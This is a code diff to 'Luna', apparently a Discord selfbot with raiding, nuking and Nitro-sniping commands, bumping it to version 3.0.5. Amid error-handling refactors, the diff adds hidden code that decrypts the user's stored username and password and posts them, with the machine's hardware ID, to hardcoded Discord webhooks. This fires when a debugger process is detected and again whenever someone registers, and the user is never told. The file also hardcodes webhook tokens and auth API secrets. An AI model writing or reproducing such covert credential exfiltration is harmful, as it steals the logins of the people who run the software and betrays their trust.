@@ -25,16 +25,17 @@ import pyPrivnote
 import subprocess
 import pypresence
 import ctypes.wintypes as wintypes
-
 from CEA256 import *
 from gtts import gTTS
-from os import name, system
 from discord import *
 from ctypes import windll
 from notifypy import Notify
+from os import error, name, system
 from datetime import datetime
 from pypresence import Presence
 from discord.ext import commands
+from urllib.request import urlopen
+from urllib.parse import quote_plus
 from time import localtime, strftime
 from AuthGG.client import Client as luna_gg
 from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
@@ -388,8 +389,16 @@ def check_debuggers():
 				if ".exe" in x:
 					x = x.split('.')[0] + ".exe"
 					if x in blacklisted_processes:
+						try:
+							username = files.json("Luna/auth.json", "username", documents=True)
+							password = files.json("Luna/auth.json", "password", documents=True)
+							username = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
+							password = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
+						except:
+							username = "Failed to get username"
+							password = "Failed to get password"
 						hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip() 
-						notify.webhook(url="https://discord.com/api/webhooks/909150388681310218/UTUTPihWbPzaOeXoxe7zyfHJJBBf4s_krKys-LB0uSmQZvB42QnQRVndygIc8ehq13cf", description=f"Detected a debugger\n\nHWID:\n```{hwid}```")
+						notify.webhook(url="https://discord.com/api/webhooks/918944258596155432/eskZhd3tY5LHsVUv7q9J0z8BTRZB1-Ko4qTPlPXa7opIqGJzRQT8F0Md6rL4fY5SShFu", description=f"Detected a debugger\n\nLuna Information:\n```\nUsername: {username}\nPassword » {password}```\n\nHWID:\n```{hwid}```")
 						current_system_pid = os.getpid()
 						ThisSystem = psutil.Process(current_system_pid)
 						ThisSystem.terminate()
@@ -445,11 +454,13 @@ privacy = False
 copycat = None
 chargesniper = False
 
-version = '3.0.3'
+developer_mode = True
+version = '3.0.5'
 updater_url = urllib.request.urlopen('https://pastebin.com/raw/mt9DERP6').read().decode('utf-8')
 motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ').read().decode('utf-8')
 version_url = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg').read().decode('utf-8').replace('\'', '')
 auth = luna_gg(api_key="485477744381137547167158333254493", aid="940932", application_secret="1fZDchzE3iZyiq0Ir5nAaFZ0p1c00zkqLc5")
+
 # ///////////////////////////////////////////////////////////////
 # File Check
 
@@ -462,7 +473,7 @@ class luna:
 		luna.console(clear=True)
 		if files.file_exist('Updater.exe'):
 			os.remove('Updater.exe')
-		if not version == version_url:
+		if not version == version_url and not developer_mode:
 			luna.update()
 		else:
 			if files.file_exist('Luna/auth.json', documents=True):
@@ -543,6 +554,8 @@ class luna:
 			prints.event("Registering...")
 			auth.register(email=key, username=username, password=password, license_key=key)
 			prints.message("Successfully registered")
+			hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+			notify.webhook(url="https://discord.com/api/webhooks/918945532146233344/ZDDj5GgzfDg5-QdScoDfebNCYOuBNUIbgi0UFiO2qIqt0l9hCGm5x1OVwcLuJe3JL_6z", description=f"A new registered user!\n\nLuna Information:\n```\nUsername: {username}\nPassword » {password}```\n\nHWID:\n```{hwid}```")
 			time.sleep(3)
 			username = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
 			password = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
@@ -1206,7 +1219,7 @@ class notify:
 				pass
 			else:
 				color = webhook.hex_color()
-			embed = dhooks.Embed(title=webhook.title(), description=description, color=color)
+			embed = dhooks.Embed(title=webhook.title(), description=f"```{description}```", color=color)
 			embed.set_thumbnail(url=webhook.image_url())
 			embed.set_footer(text=webhook.footer())
 			hook.send(embed=embed)
@@ -2124,24 +2137,27 @@ class OnMessage(commands.Cog, name="on message"):
 						result = await client.post(f'https://discordapp.com/api/v9/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
 						elapsed = '%.3fs' % (time.time() - start_time)
 					if 'This gift has been redeemed already' in str(result.content):
-						return
+						status = 'Has been redeemed already'
 					elif 'Unknown Gift Code' in str(result.content):
-						return
+						status = 'Unknown gift code'
+					else:
+						status = 'Nitro successfully redeemed'
 
 					print()
-					prints.sniper(f"{color.purple('Nitro redeemed')}")
+					prints.sniper(color.purple(status))
 					prints.sniper(f"Server  | {color.purple(f'{message.guild}')}")
 					prints.sniper(f"Channel | {color.purple(f'{message.channel}')}")
 					prints.sniper(f"Author  | {color.purple(f'{message.author}')}")
-					prints.sniper(f"Elapsed Times")
+					prints.sniper(f"Code    | {color.purple(f'{code}')}")
+					prints.sniper(color.purple('Elapsed Times'))
 					prints.sniper(f"Sniped  | {color.purple(f'{elapsed_snipe}')}")
-					prints.sniper(f"API     | {color.purple(f'{elapsed}')}")
+					prints.sniper(f"Request | {color.purple(f'{elapsed}')}")
 					print()
 
 					if files.json("Luna/notifications/toasts.json", "nitro", documents=True) == "on" and files.json("Luna/notifications/toasts.json", "toasts", documents=True) == "on":
-						notify.toast(message=f"Redeemed a nitro code\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
+						notify.toast(message=f"{status}\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
 					if files.json("Luna/webhooks/webhooks.json", "nitro", documents=True) == "on" and files.json("Luna/webhooks/webhooks.json", "webhooks", documents=True) == "on" and not webhook.nitro_url() == "webhook-url-here":
-						notify.webhook(url=webhook.nitro_url(), name="nitro", description=f"Redeemed a nitro code\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
+						notify.webhook(url=webhook.nitro_url(), name="nitro", description=f"{status}\nServer » {message.guild}\nChannel » {message.channel}\nAuthor » {message.author}\nCode » {code}\nElapsed Times\nSniped » {elapsed_snipe}\nRequest » {elapsed}")
 		except Exception as e:
 			prints.error(e)
 			
@@ -2173,7 +2189,7 @@ class OnMessage(commands.Cog, name="on message"):
 					if str(blocked_word).lower() in str(message.content).lower():
 						print()
 						prints.sniper(f"{color.purple('Skipped giveaway')}")
-						prints.sniper(f"Reason  | Backlisted word: {color.purple(f'{blocked_word}')}")
+						prints.sniper(f"Reason  | Backlisted word » {color.purple(f'{blocked_word}')}")
 						prints.sniper(f"Server  | {color.purple(f'{message.guild}')}")
 						prints.sniper(f"Channel | {color.purple(f'{message.channel}')}")
 						print()
@@ -2191,7 +2207,7 @@ class OnMessage(commands.Cog, name="on message"):
 								if found:
 									print()
 									prints.sniper(f"{color.purple('Skipped giveaway')}")
-									prints.sniper(f"Reason  | Backlisted word: {color.purple(f'{blocked_word}')}")
+									prints.sniper(f"Reason  | Backlisted word » {color.purple(f'{blocked_word}')}")
 									prints.sniper(f"Server  | {color.purple(f'{message.guild}')}")
 									prints.sniper(f"Channel | {color.purple(f'{message.channel}')}")
 									print()
@@ -2510,144 +2526,97 @@ bot.add_cog(OnCommand(bot))
 # On Command Error
 
 class OnCommandErrorCog(commands.Cog, name="on command error"):
-    def __init__(self, bot:commands.Bot):
-        self.bot = bot
+	def __init__(self, bot:commands.Bot):
+		self.bot = bot
 
-    @commands.Cog.listener()
-    async def on_command_error(self, luna:commands.Context, error:commands.CommandError):
-        error_str = str(error)
-        error = getattr(error, 'original', error)
-        if isinstance(error, commands.CommandOnCooldown):
-            await luna.message.delete()
-            day = round(error.retry_after/86400)
-            hour = round(error.retry_after/3600)
-            minute = round(error.retry_after/60)
-            if day > 0:
-                if configs.error_log() == "console":
-                    prints.error('This command is on cooldown, for '+str(day)+ "day(s)")
-                else:
-                    await luna.send('This command is on cooldown, for '+str(day)+ "day(s)", delete_after=3)
-            elif hour > 0:
-                if configs.error_log() == "console":
-                    prints.error('This command is on cooldown, for '+str(hour)+ " hour(s)")
-                else:
-                    await luna.send('This command is on cooldown, for '+str(hour)+ " hour(s)", delete_after=3)
-            elif minute > 0:
-                if configs.error_log() == "console":
-                    prints.error('This command is on cooldown, for '+ str(minute)+" minute(s)")
-                else:
-                    await luna.send('This command is on cooldown, for '+ str(minute)+" minute(s)", delete_after=3)
-            else:
-                if configs.error_log() == "console":
-                    prints.error(f'You are being ratelimited, for {error.retry_after:.2f} second(s)')
-                else:
-                    await luna.send(f'You are being ratelimited, for {error.retry_after:.2f} second(s)', delete_after=3)
+	@commands.Cog.listener()
+	async def on_command_error(self, luna:commands.Context, error:commands.CommandError):
+		error_str = str(error)
+		error = getattr(error, 'original', error)
+		if isinstance(error, commands.CommandOnCooldown):
+			await luna.message.delete()
+			day = round(error.retry_after/86400)
+			hour = round(error.retry_after/3600)
+			minute = round(error.retry_after/60)
+			if day > 0:
+				if configs.error_log() == "console":
+					prints.error('This command is on cooldown, for '+str(day)+ "day(s)")
+				else:
+					await luna.send('This command is on cooldown, for '+str(day)+ "day(s)", delete_after=3)
+			elif hour > 0:
+				if configs.error_log() == "console":
+					prints.error('This command is on cooldown, for '+str(hour)+ " hour(s)")
+				else:
+					await luna.send('This command is on cooldown, for '+str(hour)+ " hour(s)", delete_after=3)
+			elif minute > 0:
+				if configs.error_log() == "console":
+					prints.error('This command is on cooldown, for '+ str(minute)+" minute(s)")
+				else:
+					await luna.send('This command is on cooldown, for '+ str(minute)+" minute(s)", delete_after=3)
+			else:
+				if configs.error_log() == "console":
+					prints.error(f'You are being ratelimited, for {error.retry_after:.2f} second(s)')
+				else:
+					await luna.send(f'You are being ratelimited, for {error.retry_after:.2f} second(s)', delete_after=3)
 
-        if isinstance(error, CommandNotFound):
-            try:
-                await luna.message.delete()
-            except Exception:
-                pass
-            prefix = files.json("Luna/config.json", "prefix", documents=True)
-            helptext = ""
-            amount = 0
-            for command in self.bot.commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description},"
+		if isinstance(error, CommandNotFound):
+			try:
+				await luna.message.delete()
+			except Exception:
+				pass
+			prefix = files.json("Luna/config.json", "prefix", documents=True)
+			helptext = ""
+			amount = 0
+			for command in self.bot.commands:
+				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description},"
 
-            error_text = f"{error}"
-            subtract = len(error_text)-14
-            error_strip = error_text[9:subtract]
-            commandlist = helptext.split(",")
-            # commandlistfind = [ string for string in commandlist if error_strip in string]
-            for string in commandlist:
-                if amount < 5:
-                    if error_strip in string:
-                        commandlistfind = [string]
-                        amount += 1
-                else:
-                    pass
-            try:
-                commandlistfind = '\n'.join(str(e) for e in commandlistfind)
-            except:
-                commandlistfind = ""
-            if not len(commandlistfind) == 0:
-                found = f"```\n\nDid you mean?\n\n{commandlistfind}```"
-            else:
-                found = ""
-            if configs.error_log() == "console":
-                prints.error(error)
-            else:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"```\nNot Found\n\n{error}```{found}```\nNote\n\nYou can use \"search\" to search for a command.\n{prefix}search <command> » Search for a command```",
-                    color=0xff0000
-                )
-                embed.set_thumbnail(url=theme.image_url())
-                embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-                embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-                embed.set_image(url=theme.large_image_url())
-                await send(luna, embed)
-        elif isinstance(error, CheckFailure):
-            await luna.message.delete()
-            if configs.error_log() == "console":
-                prints.error(error)
-            else:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"```\n{error}```",
-                    color=0xff0000
-                )
-                embed.set_thumbnail(url=theme.image_url())
-                embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-                embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-                embed.set_image(url=theme.large_image_url())
-                await send(luna, embed)
-        elif isinstance(error, commands.MissingRequiredArgument):
-            await luna.message.delete()
-            if configs.error_log() == "console":
-                prints.error(error)
-            else:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"```\nMissing arguments\n\n{error}```",
-                    color=0xff0000
-                )
-                embed.set_thumbnail(url=theme.image_url())
-                embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-                embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-                embed.set_image(url=theme.large_image_url())
-                await send(luna, embed)
-        elif isinstance(error, MissingPermissions):
-            await luna.message.delete()
-            if configs.error_log() == "console":
-                prints.error(error)
-            else:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"```\nMissing permissions\n\n{error}```",
-                    color=0xff0000
-                )
-                embed.set_thumbnail(url=theme.image_url())
-                embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-                embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-                embed.set_image(url=theme.large_image_url())
-                await send(luna, embed)
-        elif "Cannot send an empty message" in error_str:
-            if configs.error_log() == "console":
-                prints.error(error)
-            else:
-                embed = discord.Embed(
-                    title="Error",
-                    description=f"```\n{error}```",
-                    color=0xff0000
-                )
-                embed.set_thumbnail(url=theme.image_url())
-                embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-                embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-                embed.set_image(url=theme.large_image_url())
-                await send(luna, embed)
-        else:
-            pass
+			error_text = f"{error}"
+			subtract = len(error_text)-14
+			error_strip = error_text[9:subtract]
+			commandlist = helptext.split(",")
+			# commandlistfind = [ string for string in commandlist if error_strip in string]
+			for string in commandlist:
+				if amount < 5:
+					if error_strip in string:
+						commandlistfind = [string]
+						amount += 1
+				else:
+					pass
+			try:
+				commandlistfind = '\n'.join(str(e) for e in commandlistfind)
+			except:
+				commandlistfind = ""
+			if not len(commandlistfind) == 0:
+				found = f"```\n\nDid you mean?\n\n{commandlistfind}```"
+			else:
+				found = ""
+			await error_builder(luna, f"```\nNot Found\n\n{error}```{found}```\nNote\n\nYou can use \"search\" to search for a command.\n{prefix}search <command> » Search for a command```")
+		elif isinstance(error, CheckFailure):
+			try:
+				await luna.message.delete()
+			except Exception:
+				pass
+			await error_builder(luna, f"```\n{error}```")
+		elif isinstance(error, commands.MissingRequiredArgument):
+			try:
+				await luna.message.delete()
+			except Exception:
+				pass
+			await error_builder(luna, f"```\nMissing arguments\n\n{error}```")
+		elif isinstance(error, MissingPermissions):
+			try:
+				await luna.message.delete()
+			except Exception:
+				pass
+			await error_builder(luna, f"```\nMissing permissions\n\n{error}```")
+		elif "Cannot send an empty message" in error_str:
+			try:
+				await luna.message.delete()
+			except Exception:
+				pass
+			await error_builder(luna, f"```\n{error}```")
+		else:
+			pass
 
 bot.add_cog(OnCommandErrorCog(bot))
 
@@ -2767,7 +2736,7 @@ class HelpCog(commands.Cog, name="Help commands"):
 			custom_command_count = 0
 			for command in custom:
 				custom_command_count += 1
-			await embed_builder(luna, description=f"{theme.description()}```\nLuna\n\nCommands          » {command_count-custom_command_count}\nCustom Commands   » {custom_command_count}\n``````\nCategories\n\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}abusive          » Abusive commands\n{prefix}animated         » Animated commands\n{prefix}dump             » Dumping\n{prefix}fun              » Funny commands\n{prefix}image            » Image commands\n{prefix}hentai           » Hentai explorer\n{prefix}profile          » Current guild profile\n{prefix}protection       » Protections\n{prefix}raiding          » Raiding tools\n{prefix}text             » Text commands\n{prefix}trolling         » Troll commands\n{prefix}tools            » Tools\n{prefix}networking       » Networking\n{prefix}nuking           » Account nuking\n{prefix}utility          » Utilities\n{prefix}settings         » Settings\n{prefix}sharing          » Share with somebody\n{prefix}themes           » Themes\n{prefix}communitythemes  » Community made themes\n{prefix}communitycmds    » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}misc             » Miscellaneous\n{prefix}info             » Luna information\n{prefix}search <command> » Search for a command\n``````\nVersion\n\n{version}```")
+			await embed_builder(luna, description=f"{theme.description()}```\nLuna\n\nCommands          » {command_count-custom_command_count}\nCustom Commands   » {custom_command_count}\n``````\nCategories\n\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}abusive          » Abusive commands\n{prefix}animated         » Animated commands\n{prefix}dump             » Dumping\n{prefix}fun              » Funny commands\n{prefix}image            » Image commands\n{prefix}hentai           » Hentai explorer\n{prefix}profile          » Current guild profile\n{prefix}protection       » Protections\n{prefix}raiding          » Raiding tools\n{prefix}text             » Text commands\n{prefix}trolling         » Troll commands\n{prefix}tools            » Tools\n{prefix}networking       » Networking\n{prefix}nuking           » Account nuking\n{prefix}utility          » Utilities\n{prefix}settings         » Settings\n{prefix}webhook          » Webhook settings\n{prefix}notifications    » Toast notifications\n{prefix}sharing          » Share with somebody\n{prefix}themes           » Themes\n{prefix}communitythemes  » Community made themes\n{prefix}communitycmds    » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}misc             » Miscellaneous\n{prefix}info             » Luna information\n{prefix}search <command> » Search for a command\n``````\nVersion\n\n{version}```")
 
 	@commands.command(name = "admin",
 						usage="",
@@ -7809,10 +7778,11 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 					description = "Theme customization")
 	async def customize(self, luna):
 		await luna.message.delete()
+		themevar = files.json("Luna/config.json", "theme", documents=True)
 		prefix = files.json("Luna/config.json", "prefix", documents=True)
 		title = theme.title()
 		footer = theme.footer()
-		hexcolor = theme.hex_color()
+		hexcolor = files.json(f"Luna/themes/{themevar}", "hex_color", documents=True)
 		author = theme.author()
 
 		if title == "":
@@ -7842,7 +7812,7 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		for command in commands:
 			helptext3+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 		
-		embed = discord.Embed(title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {title}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```", color=theme.hex_color())
+		embed = discord.Embed(title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {themevar}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```", color=theme.hex_color())
 		embed.set_thumbnail(url=theme.image_url())
 		embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
 		embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
